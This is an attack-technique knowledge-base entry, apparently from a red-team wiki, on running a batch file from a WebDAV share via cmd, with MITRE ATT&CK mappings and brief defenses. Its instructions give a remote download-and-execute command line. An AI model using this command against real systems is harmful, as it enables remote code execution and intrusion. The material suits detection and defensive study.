---
id: 6e79d5ec-2925-454f-84e9-f4f154a6db3d
name: WebDAV Batch File Execution via Cmd
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.812256+00:00'
updated_at: '2023-04-10T20:37:09.239654+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote File Copy|T1105 - Remote File Copy]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Cmd]]'
- '[[Windows - Download and execute methods]]'
commands:
- '[[Execute Batch File]]'
---

# WebDAV Batch File Execution via Cmd

## Summary

WebDAV Batch File Execution via Cmd is a technique used by attackers to download and execute a batch file from a WebDAV server using the command prompt. This technique is commonly used by attackers to bypass security controls and execute malicious code on target systems. 

To execute this technique

## Description

# Description

WebDAV Batch File Execution via Cmd is a technique used by attackers to download and execute a batch file from a WebDAV server using the command prompt. This technique is commonly used by attackers to bypass security controls and execute malicious code on target systems. 

To execute this technique, the attacker first needs to upload a batch file to a WebDAV server. They can then use the command prompt to download and execute the batch file on the target system. This technique can be used to achieve persistence, escalate privileges, and exfiltrate data.

For businesses, this technique highlights the need for strong security controls and monitoring of network traffic to detect and prevent malicious activity.

 

## Requirements

1. Access to a WebDAV server

1. Command prompt access

 

## Defense

1. Implement strong access controls and authentication mechanisms for WebDAV servers

1. Monitor network traffic for suspicious activity

1. Use antivirus and endpoint protection software to detect and prevent malicious code execution

 

## Objectives

1. Download and execute a batch file from a WebDAV server

 

# Instructions

1. To execute a batch file from a WebDAV server, use the following command:

 



**Code**: [[cmd.exe /k < \\webdavserver\folder\batchfile.txt]]



> This command will open a command prompt and execute a batch file located on a WebDAV server. The '/k' option will keep the command prompt window open after the batch file has finished executing. The '\\webdavserver\folder\batchfile.txt' argument specifies the location of the batch file on the WebDAV server. Make sure to replace 'webdavserver' with the name of your WebDAV server and 'folder' with the name of the folder where the batch file is located.



**Command** ([[Execute Batch File]]):

```bash
cmd.exe /k < \\webdavserver\folder\batchfile.txt
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote File Copy|T1105 - Remote File Copy]]
- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Execute Batch File]]

## Tags

- [[Cmd]]
- [[Windows - Download and execute methods]]


